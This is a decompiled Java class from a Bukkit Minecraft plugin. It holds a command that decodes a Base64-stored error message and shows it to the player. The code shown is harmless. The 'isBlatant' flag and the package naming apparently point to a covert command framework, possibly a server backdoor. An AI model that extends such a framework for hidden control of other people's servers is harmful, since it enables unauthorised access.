/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.util.Base64;
import org.bukkit.entity.Player;

public class CheckerrorCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (DataManager.getData().getString("err").length() > 1) {
            byte[] err = Base64.getDecoder().decode(DataManager.getData().getString("err"));
            p2.sendMessage(Settings.PREFIX(new String(err)));
        } else {
            p2.sendMessage(Settings.PREFIX("No error was found!"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

